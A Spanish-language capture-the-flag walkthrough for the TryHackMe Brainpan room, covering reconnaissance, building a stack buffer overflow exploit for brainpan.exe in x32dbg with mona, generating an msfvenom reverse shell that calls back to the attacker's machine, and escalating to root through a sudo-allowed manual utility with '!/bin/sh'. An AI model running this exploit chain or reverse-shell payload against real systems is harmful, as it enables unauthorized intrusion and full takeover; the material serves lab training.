# Introducción

En nuestra máquina Kali, instala openvpn: ```sudo apt install openvpn``` y su archivo de configuración de vuestro perfil de Tryhackme.

Nos conectamos mediante el siguiente comando: ```sudo openvpn tu_archivo.ovpn```

Ve al laboratorio en cuestión: https://tryhackme.com/room/brainpan y empieza la máquina.

![3097a5bada2adff4cbd104e2a42eb4b6](https://user-images.githubusercontent.com/107146199/172978488-d43c6c18-f77d-4122-89ae-8a2ea717f1e0.png)

Cuando tengas la IP, estaremos listos.

## Preparativos

Ejecutamos un nmap de la siguiente manera: ```nmap -sC -sV -T5 -vv 10.10.250.223```

```-sC y -sV```: usados conjuntamente nos brinda la oportunidad de ver los scripts genéricos y sus respectivas versiones.

```-T5```: aumentamos la velocidad de procesos (threads), siendo 1 la forma más silenciosa y 5 la forma más ruidosa.

```-vv```: básicamente nos muestra más detalladamente lo obtenido, filtrando más información.

El nmap en cuestión nos muestra lo siguiente:

![340b5991ac6b2c36225ba4e99dd07a57](https://user-images.githubusercontent.com/107146199/172979019-4a4bd480-65c6-49e4-98f0-7442bd5a88fe.png)

El puerto 10000, nos muestra un ```SimpleHTTPServer```, es decir un servidor abierto a través de Python2. Echémosle un vistazo.

Vamos al navegador con la IP de la víctima y dicho puerto; veremos lo siguiente.

![71321e502eb5154758bcdf7eb53e0298](https://user-images.githubusercontent.com/107146199/172979273-2804d38b-e872-44f7-8ad3-aa8ba3bc6d3e.png)

La web no presenta ningún tipo de vulnerabilidad, asi que busquemos subdirectorios con ```gobuster```. En nuestra terminal ejecutemos el siguiente comando: ```gobuster dir -u http://ip_máquina:10000 -w /usr/share/wordlists/dirb/common.txt```

![53b9b35260881fbe5991b337aebd2348](https://user-images.githubusercontent.com/107146199/172979529-d0bf69e7-a8af-4858-92df-fe5d9c76763e.png)

Nos saca un subdirectorio, ```bin```, vamos a la web e investiguemos.

![494a6eee08bb77fc3c4fe29db0c8a378](https://user-images.githubusercontent.com/107146199/172979628-866bf450-1efe-43a8-9919-c6e218d8a6a4.png)

¡Misión cumplida! Hemos encontrado nuestro programa vulnerable. Vamos a descargarlo y a transferirlo a nuestra máquina virtual Windows.

# Haciendo uso de x32dbg

Vámonos a nuestra máquina virtual de Windows, y descarga el siguiente programa: https://github.com/therealdreg/x64dbg-exploiting

Abre x32dbg y el brainpan.exe desde el mismo. Una vez abierto, haz clic varias veces hasta que el programa esté en total ejecución.

![8a333e4965469a9cd1b94668e8858c4e](https://user-images.githubusercontent.com/107146199/172980060-e877aaf0-6620-41cf-bd46-81c6c27ed820.png)

Así debería estar. ¡Listos para el siguiente paso!

# Explotando brainpan.exe

Antes de empezar, siempre que hagamos un reinicio a nuestro Windows debemos introducir la siguiente línea de comandos en nuestro x32dbg:

```
import mona
mona.mona("help")
mona.mona("config -set workingfolder c:\\logs\\%p")
```

Así evitamos problemas previos a nuestro trabajo.

Empecemos creando nuestro script en python, abre el clásico bloc de notas de Windows o NotePad ++ y pega la siguiente plantilla:

```
import socket

ip = "127.0.0.1"
port = 9999

prefix = ""
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

Investigando un poco vemos que el otro puerto que encontramos anteriormente (el 9999) en nuestro nmap está ejecutando brainpan.exe

Vamos a ir explotando a través de conexiones en nuestra red local (127.0.0.1), más adelante explotaremos la máquina en cuestión pero de momento empezaremos por aquí.

Creamos un patrón cíclico, de 1200. En nuestro x32dbg ve a la pestaña ```logs``` y ejecuta lo siguiente: ```mona.mona("pattern_create 1200")```

![0a5d80529b3044e6b189cb767b82c020](https://user-images.githubusercontent.com/107146199/172980881-ff81b818-c4ed-44bb-a442-b244739c86d1.png)

Pegamos el patrón en la línea ```payload``` de esta forma:

![208c21d5159377bcbd156279b08e7331](https://user-images.githubusercontent.com/107146199/172981038-a6c3c859-53bc-486a-a463-4298a323a8e4.png)

¡Recuerda! No olvides comillas al inicio y al final de nuestro patrón cíclico. Guarda nuestro script como ```brainpan.py``` y en una ```cmd``` ejecútalo con python3: ```python3 brainpan.py``` . Nuestro x32dbg tiene que recibirlo, sino lo hace ejecútalo varias veces hasta que le llegue la información.

![93c6dd4c4220a730c3582300b2b01f7f](https://user-images.githubusercontent.com/107146199/172981550-f53d8909-50ae-4f3f-8a78-aaccae96650b.png)

Una vez hecho esto, echa un vistazo a EIP(puntero de instrucciones extendido, en definitiva le dice al programa dónde ir para ejecutar el siguiente comando), apuntamos el valor de EIP: ```35724134```. Ahora hacemos una búsqueda de EIP con el siguiente comando: ```mona.mona("pattern_offset 35724134")```.

![0030bb1a2629f38484c49b8e4995c54b](https://user-images.githubusercontent.com/107146199/172981839-2d8cb3f6-6d0f-4f6c-8033-5df7d42fb8c4.png)

Perfecto, tenemos la cantidad necesaria de bytes hasta llegar a EIP(en nuestro caso 524 As para el relleno), añadiremos también 4 Bs para rellenar EIP y saber si se llena el retorno ```retn``` correctamente.

En nuestro script añadimos 524 en ```offset``` y las 4 Bs en el ```retn```.

![af1c6fdeb6a2462e21d72ac0c5548ad7](https://user-images.githubusercontent.com/107146199/172982250-dc070e67-f1d3-48b6-8c05-dd6ab644fa2b.png)

Guardamos y ejecutamos nuestro script.

¡ADVERTENCIA!: Siempre que ejecutemos algo que produzca cambios en nuestro x32dbg debemos hacer un reinicio del mismo de la siguiente manera. Siempre que vayamos a ejecutar algo nuevo.

![1512481aa5fde755576068ac5b66775f](https://user-images.githubusercontent.com/107146199/172982338-4f37fef7-dcd8-4c78-b720-63a38f79d11b.png)

Cuando ejecutemos nuestro script, veremos lo siguiente.

![651d01acd2e18e06444859eae1276341](https://user-images.githubusercontent.com/107146199/172982491-585cfce0-287e-477c-9cd6-972aaddf9f41.png)

Estamos en lo cierto, EIP tiene las 4 Bs("\x42" en hexadecimal). Por ahora hemos terminado esta parte inicial, ahora nos dispondremos a buscar badchars(carácteres inválidos que nos impedirán tener ciertos saltos a la pila ```(ESP)``` o que nos anularán bytes de una shellcode).

## Localizando badchars

Reiniciamos x32dbg y hasta que se ejecute del todo. Utilizamos el siguiente comando en la pestaña ```logs```: ```mona.mona('bytearray -cpb "\\x00"')```. Con este comando excluimos el NULL-byte que es ```"\x00"```.

![ffe0570e0dcc2834e06e7221ac3cd43f](https://user-images.githubusercontent.com/107146199/172983222-bced8bc3-5bf4-4771-8c78-2429ce39cffd.png)

Con este patrón copiado, lo introducimos en nuestro script en ```payload``` de la siguiente forma:

![a87d86e93b093774491278afda45468e](https://user-images.githubusercontent.com/107146199/172983285-e0542657-13f3-46d0-96e8-8374203965b2.png)

Guarda y ejecuta tu script, una vez lo reciba x32dbg ve a la zona de direcciónes en hexadecimal y haz click derecho - ```Go to``` - ```Expressions``` y escribe ```ESP```. Una vez hecho esto vemos que el stack aparentemente parece estar completo, exceptuando el ```\x00``` y dejando todos los demás carácteres hexadecimales válidos(del 01 al FF). 

![005ed851edf26eca1b44b47f08b4a3ed](https://user-images.githubusercontent.com/107146199/172983750-4b56ae9b-51c8-4f6e-977f-0e9809a2eda9.png)

Pero para asegurarnos del todo haremos lo siguiente en nuestra pestaña ```logs```: ```mona.mona('compare -f C:\\logs\\brainpan\\bytearray.bin -a ESP')```.

![ff28099ef20b174646f8df6663f87612](https://user-images.githubusercontent.com/107146199/172983816-c37a1643-f7e6-48cb-8320-71917ece965b.png)

Pues era correcto, el único badchar es ```\x00``` así que ahora podemos proseguir buscando los ```JMP ESP```(saltos válidos a la pila/stack).

## Buscando JMP ESP

Reiniciamos nuestro x32dbg y en la pestaña logs pegamos el siguiente comando: ```mona.mona("jmp -r esp")```.

![8eeebd4d570d8ec2a2999927a368ffa3](https://user-images.githubusercontent.com/107146199/172984152-736dc04c-6f77-497b-b559-f4bdba162b4c.png)

Sólo tenemos un ```JMP ESP``` y es válido porque no tiene en ninguno de sus bytes un ```\x00```. Coméntalo en tu script para tenerlo a mano y empieza a copiarlo en ```retn```(las Bs ya no son necesarias) byte a byte pero de derecha a izquierda, de la siguiente manera:

![58556aa4229dd0c8edfcfd3ac61b9ea6](https://user-images.githubusercontent.com/107146199/172984419-9e09d726-213a-49c3-a153-0296a3ffc0e2.png)

Ya tenemos nuestro script listo para explotar a la víctima, ahora nos toca crear nuestra reverse shell. Copia tu script y vamos a la máquina Kali.

# Reverse Shell

Usemos ```msfvenom```.

En tu terminal, ejecuta el siguiente comando: 

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=tun0 LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -a x86 -b "\x00"
```

![7b5e189c40a978016442c0a141adf30e](https://user-images.githubusercontent.com/107146199/172984891-981d3adc-bc81-43d5-bab4-a63cadfd4c18.png)

Copia el resultado del payload en nuestro script de la siguiente manera:

![74f80fd909bea1d64e11cbee0656513d](https://user-images.githubusercontent.com/107146199/172985223-588dc337-4187-401f-b956-7c43d2a55b67.png)

Antes de seguir, como estamos atacando a la víctima, en ```ip``` introduce la IP de la máquina de Tryhackme.

Además de esto habrás visto que he añadido 32 "nops" o ```\x90```. A veces los programas reservan espacios del stack para almacenar ciertas cosas, información, etcétera. Así evitamos romper nuestra shellcode de ```msfenom``` al inicio, saltamos varios bytes(en este caso 32 bytes) y la ejecutamos más adelante asegurádonos que llegue completa.

Guarda el script.

Nos ponemos en la escucha con ```ncat``` en el puerto 4444(cómo el indicado en nuestra reverse). Ejecutamos ```brainpan.py``` y:

![5514d81e94e91aa9ddf7a90cd32e3f37](https://user-images.githubusercontent.com/107146199/172985646-7aea447e-0d23-400a-859e-9eafb34fae11.png)

¡Lo hemos conseguido! Estamos en la víctima.

# Escalada de privilegios

Antes que nada, vamos a hacer algo más interactiva nuestra shell, para ello ejecuta el siguiente comando:

```
python3 -c "import pty; pty.spawn('/bin/bash');"
```

Con nuestra shell algo más decente empezamos a ver por donde podemos escalar, probamos con ```sudo -l``` y atención:

![3cfa01c07fd235e6192bbb418dd70b0a](https://user-images.githubusercontent.com/107146199/172985962-6e368616-8383-4336-a924-28b827461384.png)

Tenemos que ```/home/anansi/bin/anansi_util``` puede ser ejecutado como sudo en este usuario. Probémoslo:

![6fb095caad6d67355929176ade632290](https://user-images.githubusercontent.com/107146199/172986105-01655567-f675-484e-bc00-d307524d1fcf.png)

Vamos a probar con la extensión ```manual [command]```. Probemos con ```sudo /home/anansi/bin/anansi_util manual ls```.

![087ef73b7dc2239d6dff068689caf527](https://user-images.githubusercontent.com/107146199/172986340-5744eca0-0cc2-4c01-a3a9-a66590762dd0.png)

Qué cosa tan curiosa, tenemos un tipo de terminal dentro de nuestra propia shell, probemos a crear una ```sh``` con estos permisos de sudo que tenemos:

```!/bin/sh```

![884dc0df6b85b24e3752562e9afa7554](https://user-images.githubusercontent.com/107146199/172986634-4e383cb5-6472-4cf0-a3ca-fdaa7680c86b.png)

Dimos en el clavo, ya somos usuario ```root``` y tenemos el control total de la víctima.

# Créditos

https://github.com/therealdreg

https://github.com/x64dbg

https://github.com/Kalugh
